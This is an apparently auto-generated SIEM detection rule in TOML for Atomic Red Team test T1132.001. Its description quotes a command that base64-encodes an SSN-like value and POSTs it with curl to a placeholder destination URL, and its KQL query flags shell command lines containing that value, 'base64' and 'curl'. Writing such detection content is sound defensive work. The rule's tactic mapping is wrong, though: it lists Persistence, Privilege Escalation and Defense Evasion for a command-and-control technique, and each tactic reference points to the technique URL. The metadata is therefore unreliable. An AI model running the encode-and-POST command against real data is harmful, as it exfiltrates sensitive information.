[rule]
author = [ "AtomicRedTeam-Automation",]
description = "Detection for specific test 'Base64 Encoded data.' (GUID: 1164f70f-9a88-4dff-b9ff-dc70e7bf0c25) of technique T1132.001 (Data Encoding: Standard Encoding). Test Description: Utilizing a common technique for posting base64 encoded data.. Command/Steps: echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n"
from = "now-9m"
rule_id = "b22cb827-14e6-4a10-b665-e355a22d0507"
language = "kql"
name = "Atomic Test: T1132.001 - Base64 Encoded data."
output_index = ".siem-signals-default"
references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1132.001/T1132.001.yaml",]
risk_score = 50
severity = "medium"
tags = [ "AtomicRedTeam", "T1132.001", "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25", "macos", "linux",]
type = "query"
query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*111-11-1111*\\\" AND process.command_line : \\\"*base64*\\\" AND process.command_line : \\\"*curl*\\\""
version = 1
index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1132.001"
name = "Base64 Encoded data."
reference = "https://attack.mitre.org/techniques/T1132/001"

[[rule.threat.tactic]]
id = "TA0003"
name = "Persistence"
reference = "https://attack.mitre.org/techniques/T1132/001"

[[rule.threat.tactic]]
id = "TA0004"
name = "Privilege Escalation"
reference = "https://attack.mitre.org/techniques/T1132/001"

[[rule.threat.tactic]]
id = "TA0005"
name = "Defense Evasion"
reference = "https://attack.mitre.org/techniques/T1132/001"


